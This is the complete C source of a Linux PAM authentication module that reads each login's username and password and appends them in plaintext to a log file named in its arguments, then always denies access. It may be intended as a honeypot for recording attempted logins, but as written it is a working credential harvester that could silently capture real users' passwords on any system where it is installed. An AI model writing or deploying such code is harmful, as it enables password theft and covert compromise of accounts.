#define PAM_SM_AUTH

#include <stdio.h>
#include <stdlib.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
        const char *logfile;
        if (argc >= 1)
        {
                logfile = argv[0];
        }
        else
        {
                return PAM_PERM_DENIED;
        }
        int pgu_ret, pga_ret;
        const char *username = NULL;
        const char *password = NULL;

        pgu_ret = pam_get_user(pamh, &username, NULL);
        if (pgu_ret != PAM_SUCCESS || username == NULL)
        {
                return PAM_PERM_DENIED;
        }

        pga_ret = pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
        if (pga_ret != PAM_SUCCESS || password == NULL || password[0] == '\b')
        {
                return PAM_PERM_DENIED;
        }

        FILE *pFile = fopen(logfile, "a");
        fprintf(pFile, "%s:%s\n", username, password);
        fclose(pFile);

        return PAM_PERM_DENIED;
}